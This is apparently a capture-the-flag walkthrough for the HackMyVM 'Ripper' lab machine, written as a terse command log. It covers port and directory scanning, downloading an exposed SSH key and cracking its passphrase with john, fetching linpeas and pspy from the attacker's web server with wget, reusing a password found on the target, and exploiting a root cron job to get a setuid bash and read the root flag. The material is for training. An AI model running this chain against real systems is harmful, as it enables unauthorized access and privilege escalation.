### Write up for https://hackmyvm.eu/machines/machine.php?vm=Ripper ###

nmap -v -T4 -p- -sC -sV -oN nmap.log $ip  

firefox $ip
//nothing special found on the website/source code etc

nikto -h $ip

//nothing special found

feroxbuster -n -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip -x php,txt,html,zip,bak,htm,cgi -t 100
//nothing special 

findings
staff_statements.txt
firefox $ip/staff_statements.txt

The site is not yet repaired. Technicians are working on it by connecting with old ssh connection files.

old ssh ? maybe id_rsa.bak

wget $ip/id_rsa.bak
chmod 600 id_rsa.bak 

ssh jack@$ip -i id_rsa.bak "jack can be found from the virtual machine"
we need the password for that id

/usr/share/john/ssh2john.py id_rsa.bak > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

password : b******s

checking for sudo -l but command not found
its linpeas time

//on new terminal 
cd ~Downloads
python3 -m http.server 80

//on the terminal that we are loged in as jack
wget {ourip}/linpeas.sh

chmod +x linpeas.sh
./linpeas.sh

findings : 
user helder
cat /etc/***/opasswd 
password for jack 

//lets try jacks pass for user helder

su helder

//we are in

cd
cat user.txt ( user flag)

//we got user flag lets try to get root flag

//another linpeas but nothing
//lets try pspy64

wget {our ip}/pspy64
chmod +x pspy64
./pspy64

//findings
 /bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi 

echo "bash" > root
nc -lnvp 10000 < root
ls -la /usr/bin/bash

bash -p

id

// uid=1001(helder) gid=1001(helder) euid=0(root) egid=0(root) groups=0(root),1001(helder)
cd /root
cat root.txt (root flag)